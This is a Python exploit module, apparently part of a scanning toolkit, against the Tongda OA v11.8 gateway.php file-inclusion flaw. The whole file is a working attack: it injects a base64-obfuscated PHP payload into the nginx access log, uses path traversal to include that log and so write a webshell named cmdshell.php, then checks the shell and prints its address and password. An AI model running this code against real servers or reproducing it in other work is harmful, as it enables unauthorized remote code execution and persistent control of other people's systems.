import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from lib.Urldeal import umethod
from lib import *
import logging



def 通达OA_v11_8_getway_远程文件包含(Url):
    scheme, url, port = umethod(Url)
    urldata = scheme + "://" + url + ':' + str(port) + '/'
    headers = {
        "User-Agent": "Go-http-client/1.1",
        "Accept-Encoding":"gzip",
        }
    headerx = {
        "User-Agent": "Go-http-client/1.1",
        "Accept-Encoding":"gzip",
        "Content-Type":"application/x-www-form-urlencoded"
        }
    payload='''d1a4278d?json={}&aa=<?php @fputs(fopen(base64_decode('Y21kc2hlbGwucGhw'),w),base64_decode('PD9waHAgQGV2YWwoJF9QT1NUWydjbWRzaGVsbCddKTs/Pg=='));?>'''
    data='json={"url":"/general/../../nginx/logs/oa.access.log"}'

    incloud_url=urldata+payload
    exp_url=urldata+'ispirit/interface/gateway.php'
    vlun_url=urldata+'mac/gateway.php'
    shell_url=urldata+'mac/cmdshell.php'

    try:
        requests.packages.urllib3.disable_warnings()
        log = requests.get(incloud_url, headers=headers, verify=False)
        response1=requests.post(exp_url, headers=headerx, data=data,verify=False)
        response2=requests.post(vlun_url, headers=headerx, data=data,verify=False)
        shell = requests.get(shell_url, headers=headers, verify=False)
        if   response2.status_code == 200:
            print(Vcolors.RED +"[+] 包含漏洞存在，包含数据包为:{}".format(vlun_url) +Vcolors.ENDC)
            print(Vcolors.RED +''' [SUCCESS]  POST /mac/gateway.php HTTP/1.1
                       Host: 
                       User-Agent: Go-http-client/1.1
                       Content-Length: 54
                       Content-Type: application/x-www-form-urlencoded
                       Accept-Encoding: gzip

                       json={"url":"/general/../../nginx/logs/oa.access.log"}''' +Vcolors.ENDC)

            if  shell.status_code==200:
                print(Vcolors.RED + "[+] 上传webshell成功，密码为cmdshell，shell地址:{}".format(shell_url) + Vcolors.ENDC)

            else:
                print(Vcolors.WARNING +"[x] 通达OA 包含日志成功，可查取日志文件，但无法在目录下生成webshell")
        else:
            print(Vcolors.WARNING + "[x] 通达OA v11.8远程包含不存在")

    except:
        logging.error("通达OA_v11_8_getway_远程文件包含脚本出现异常")

